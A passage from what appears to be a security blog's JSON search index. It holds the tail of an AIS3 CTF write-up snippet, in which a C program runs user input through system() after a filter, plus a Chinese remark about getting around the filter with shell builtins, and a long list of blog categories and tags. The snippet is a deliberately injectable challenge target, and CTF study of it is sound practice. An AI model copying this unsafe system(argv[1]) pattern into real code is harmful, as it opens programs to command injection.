if(filter(argv[1])) return 0; printf(&quot;%s\\n&quot;, argv[1]); system( argv[1] ); return 0;&#125; 總之只能用sh內建的指令echo跟pwd啥的，加上一些神奇的東西就變成：","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"AIS3","slug":"AIS3","permalink":"http://blog.terrynini.tw/tags/AIS3/"}]}],"categories":[{"name":"Record","slug":"Record","permalink":"http://blog.terrynini.tw/categories/Record/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"},{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"},{"name":"TodayILearn","slug":"TodayILearn","permalink":"http://blog.terrynini.tw/categories/TodayILearn/"},{"name":"Reminder","slug":"Reminder","permalink":"http://blog.terrynini.tw/categories/Reminder/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Reversing","slug":"Reversing","permalink":"http://blog.terrynini.tw/tags/Reversing/"},{"name":"GameHacking","slug":"GameHacking","permalink":"http://blog.terrynini.tw/tags/GameHacking/"},{"name":"CSS","slug":"CSS","permalink":"http://blog.terrynini.tw/tags/CSS/"},{"name":"Dev","slug":"Dev","permalink":"http://blog.terrynini.tw/tags/Dev/"},{"name":"Travel","slug":"Travel","permalink":"http://blog.terrynini.tw/tags/Travel/"},{"name":"Balsn","slug":"Balsn","permalink":"http://blog.terrynini.tw/tags/Balsn/"},{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"Flare-On","slug":"Flare-On","permalink":"http://blog.terrynini.tw/tags/Flare-On/"},{"name":"AFL++","slug":"AFL","permalink":"http://blog.terrynini.tw/tags/AFL/"},{"name":"QEMU","slug":"QEMU","permalink":"http://blog.terrynini.tw/tags/QEMU/"},{"name":"OSCP","slug":"OSCP","permalink":"http://blog.terrynini.tw/tags/OSCP/"},{"name":"Web","slug":"Web","permalink":"http://blog.terrynini.tw/tags/Web/"},{"name":"Cryptography","slug":"Cryptography","permalink":"http://blog.terrynini.tw/tags/Cryptography/"},{"name":"Pwn","slug":"Pwn","permalink":"http://blog.terrynini.tw/tags/Pwn/"},{"name":"Misc","slug":"Misc","permalink":"http://blog.terrynini.tw/tags/Misc/"},{"name":"AIS3","slug":"AIS3","permalink":"http://blog.terrynini.tw/tags/AIS3/"},{"name":"Base64","slug":"Base64","permalink":"http://blog.terrynini.tw/tags/Base64/"},{"name":"AVX","slug":"AVX","permalink":"http://blog.terrynini.tw/tags/AVX/"},{"name":"Windows","slug":"Windows","permalink":"http://blog.terrynini.tw/tags/Windows/"},{"name":"Plaid","slug":"Plaid","permalink":"http://blog.terrynini.tw/tags/Plaid/"},{"name":"0CTF","slug":"0CTF","permalink":"http://blog.terrynini.tw/tags/0CTF/"},{"name":"browser","slug":"browser","permalink":"http://blog.terrynini.tw/tags/browser/"},{"name":"Chakra","slug":"Chakra","permalink":"http://blog.terrynini.tw/tags/Chakra/"},{"name":"JIT","slug":"JIT","permalink":"http://blog.terrynini.tw/tags/JIT/"},{"name":"CONFidence","slug":"CONFidence","permalink":"http://blog.terrynini.tw/tags/CONFidence/"},{"name":"FaceBook","slug":"FaceBook","permalink":"http://blog.terrynini.tw/tags/FaceBook/"},{"name":"GIF","slug":"GIF","permalink":"http://blog.terrynini.tw/tags/GIF/"},{"name":"Pragyan","slug":"Pragyan","permalink":"http://blog.terrynini.tw/tags/Pragyan/"},{"name":"Reversing-kr","slug":"Reversing-kr","permalink":"http://blog.terrynini.tw/tags/Reversing-kr/"},{"name":"RealWorldCTF","slug":"RealWorldCTF","permalink":"http://blog.terrynini.tw/tags/RealWorldCTF/"},{"name":"OS","slug":"OS","permalink":"http://blog.terrynini.tw/tags/OS/"},{"name":"ASIS","slug":"ASIS","permalink":"http://blog.terrynini.tw/tags/ASIS/"},{"name":"Algorithm","slug":"Algorithm","permalink":"http://blog.terrynini.tw/tags/Algorithm/"},{"name":"SECCON","slug":"SECCON","permalink":"http://blog.terrynini.tw/tags/SECCON/"},{"name":"HITCON","slug":"HITCON","permalink":"http://blog.terrynini.tw/tags/HITCON/"}]}